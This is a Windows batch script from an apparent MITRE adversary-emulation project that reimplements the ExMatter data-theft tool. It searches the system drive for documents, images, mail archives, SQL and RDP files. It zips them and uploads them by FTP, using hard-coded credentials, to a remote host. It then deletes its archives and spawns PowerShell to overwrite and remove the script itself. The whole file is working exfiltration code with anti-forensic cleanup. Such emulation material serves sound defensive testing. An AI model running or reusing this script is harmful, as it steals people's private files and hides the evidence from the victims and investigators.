:: ---------------------------------------------------------------------------
:: exmatter.bat - Alternative batch script if execution of ExMatter binary fails

:: Copyright 2024 MITRE Engenuity. Approved for public release. Document number CT0005.
:: Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except in compliance with the License. You may obtain a copy of the License at

:: http://www.apache.org/licenses/LICENSE-2.0

:: Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.

:: This project makes use of ATT&CK®
:: ATT&CK Terms of Use - https://attack.mitre.org/resources/terms-of-use/ 
 
:: Usage: .\exmatter.bat
 
:: Revision History:
 
:: --------------------------------------------------------------------------- 

@ECHO off
set ftppass=Cardstock-Empirical
@setlocal enabledelayedexpansion
set minfilesize=4096
set maxfilesize=67108864
set targetfilecount=0
set originalpwd=%cd%
set ftphost=hide-the-secret-password-inator.net
set ftpuser=sftpupload
set ftpcommandfile="%cd%\arch.txt"
set logfile="%cd%\EMBatLog.txt"

:: Get target files
cd %SYSTEMDRIVE%\
ECHO [INFO] Searching for target files >> %logfile%
FOR /F "tokens=*" %%d IN ('dir /b /a:d-l') DO (
    CALL :processInitialDir "%cd%%%d"
)

ECHO [INFO] Found a total of %targetfilecount% files: >> %logfile%
set /A maxindex=targetfilecount-1
FOR /L %%x IN (0,1,%maxindex%) DO (
    ECHO [DEBUG] !targetfiles[%%x]! >> %logfile%
)

IF "%targetfilecount%" EQU "0" (
    ECHO [INFO] No target files found. >> %logfile%
    CALL :clearSelf
    GOTO :eof
)
cd %originalpwd%

:: Create zip files. Recommend max files per zip of 30 due to 260 max path length and 8191 max command line string length
set filesperzip=25
set numarchives=0
set zippedfiles=0
set numsuccessfulzips=0
set commandline=tar.exe -a -c -f "%originalpwd%\archive!numarchives!.zip"
FOR /L %%x IN (0,1,%maxindex%) DO (
    set filename=!targetfiles[%%x]!
    set "commandline=!commandline! !filename!"
    set /A zippedfiles=zippedfiles+1
    set /A counter=zippedfiles %% filesperzip
    IF "!counter!" EQU "0" (
        ECHO [DEBUG] Executing: !commandline! >> %logfile%
        !commandline! >> %logfile% 2>&1 && (
            set createdzips[!numsuccessfulzips!]="%originalpwd%\archive!numarchives!.zip"
            set /A numsuccessfulzips=numsuccessfulzips+1
            ECHO [INFO] Created archive %originalpwd%\archive!numarchives!.zip >> %logfile%
        )
        set /A numarchives=numarchives+1
        set commandline=tar.exe -a -c -f "%originalpwd%\archive!numarchives!.zip"
    ) ELSE (
        IF !zippedfiles! GTR %maxindex% (
            ECHO [DEBUG] Executing: !commandline! >> %logfile%
            !commandline! >> %logfile% 2>&1 && (
                set createdzips[!numsuccessfulzips!]="%originalpwd%\archive!numarchives!.zip"
                set /A numsuccessfulzips=numsuccessfulzips+1
                ECHO [INFO] Created archive %originalpwd%\archive!numarchives!.zip >> %logfile%
            )
            set /A numarchives=numarchives+1
        )
    )
)
ECHO [INFO] Created a total of !numsuccessfulzips! archives. >> %logfile%

:: Exfiltrate via FTP
IF "!numsuccessfulzips!" EQU "0" (
    ECHO [INFO] No zip archives created. >> %logfile%
    CALL :clearSelf
    GOTO :eof
)
set remotedir=%computername%%DATE:~-4%%DATE:~4,2%%DATE:~7,2%%TIME:~0,2%%TIME:~3,2%%TIME:~6,2%
set /A maxarchiveindex=numsuccessfulzips-1
ECHO open %ftphost%> %ftpcommandfile%
ECHO %ftpuser%>> %ftpcommandfile%
ECHO !ftppass!>> %ftpcommandfile%
ECHO pwd >> %ftpcommandfile%
ECHO mkdir %remotedir% >> %ftpcommandfile%
ECHO cd %remotedir% >> %ftpcommandfile%
FOR /L %%x IN (0,1,!maxarchiveindex!) DO (
    set archivepath=!createdzips[%%x]!
    ECHO put !archivepath! >> %ftpcommandfile%
)
ECHO ls >> %ftpcommandfile%
ECHO quit >> %ftpcommandfile%
ECHO [DEBUG] FTP command file contents: >> %logfile%
type %ftpcommandfile% >> %logfile%
ECHO [INFO] Executing FTP >> %logfile%
ftp.exe -s:%ftpcommandfile% >> %logfile% 2>&1

:: Cleanup
del /q %ftpcommandfile%
FOR /L %%x IN (0,1,!maxarchiveindex!) DO (
    set archivepath=!createdzips[%%x]!
    del /q !archivepath! >> %logfile% 2>&1
)

CALL :clearSelf
GOTO :eof

:clearSelf
:: Create powershell process to delete self
ECHO [INFO] Spawning powershell destructor with argument: >> %logfile%
set batfilepath=%~f0
set pwsharg="$path = '%batfilepath%'; Start-Sleep -Seconds 5; Get-Process | Where-Object {$_.Path -like $path} | Stop-Process -Force; [byte[]]$arr = New-Object byte[] 65535; Set-Content -Path $path -Value $arr; Remove-Item -Path $path;"
ECHO %pwsharg% >> %logfile%
start powershell.exe %pwsharg% >> %logfile% 2>&1
GOTO :eof

:processInitialDir directory
:: for testing you can also skip "C:\Users" "C:\tools" "C:\vcpkg" to make things faster
FOR %%b IN ("C:\$Recycle.Bin" "C:\Documents and Settings" "C:\PerfLogs" "C:\Program Files" "C:\Program Files (x86)" "C:\ProgramData" "C:\Windows") DO (
    IF /I "%~1" == "%%~b" (
        ECHO [DEBUG] Skipping %~1 >> %logfile%
        GOTO CONTINUE
    )
)
cd "%~1" 2> NUL && (
    CALL :processDir
    cd .. 2> NUL
)
GOTO :eof

:processDir
:: Recurse through directories, populating array with target files
ECHO [DEBUG] Searching for valid files in %cd% >> %logfile%
FOR /F "tokens=*" %%f IN ('dir /b /a:-s *.bmp *.doc *.docx *.dwg *.ipt *.jpeg *.jpg *.msg *.pdf *.png *.pst *.rdp *.rtf *.sql *.txt *.xls *.xlsx *.zip 2^> NUL') DO (
    CALL :processFile "%cd%\%%f"
)
:: Iterate through subdirectories, skipping reparse points
FOR /F "tokens=*" %%s IN ('dir /b /a:d-l 2^> NUL') DO (
    call :checkAndProcessDir "%cd%\%%s"
)
GOTO :eof

:checkAndProcessDir directory
:: If directory is allowed, process it
set subdir="%~1\"
IF /I %subdir% == "C:\Users\All Users\Microsoft" (
    ECHO [DEBUG] Skipping %~1 >> %logfile%
    GOTO CONTINUE   
)

IF /I NOT %subdir:\AppData\Local\Microsoft\=% == %subdir% (
    ECHO [DEBUG] Skipping %~1 >> %logfile%
    GOTO CONTINUE
)
IF /I NOT %subdir:\AppData\Roaming\Microsoft\=% == %subdir% (
    ECHO [DEBUG] Skipping %~1 >> %logfile%
    GOTO CONTINUE
)
IF /I NOT %subdir:\AppData\Local\Packages\=% == %subdir% (
    ECHO [DEBUG] Skipping %~1 >> %logfile%
    GOTO CONTINUE
)
cd "%~1" 2> NUL && (
    CALL :processDir
    cd .. 2> NUL
)
GOTO :eof

:processFile file
:: Check file size and add to array
set size=%~z1
IF %size% LSS %maxfilesize% (
    IF %size% GTR %minfilesize% (
        FOR %%f IN ("%~1") DO (
            set attributes=%%~af
            IF "!attributes:t=!" == "!attributes!" (
                set targetfiles[!targetfilecount!]="%%~f"
                set /A targetfilecount=targetfilecount+1
                REM
            ) ELSE (
                ECHO [DEBUG] Skipping temp file %%~f >> %logfile%
            )
        )
    )
)
GOTO :eof

:CONTINUE
REM
GOTO :eof
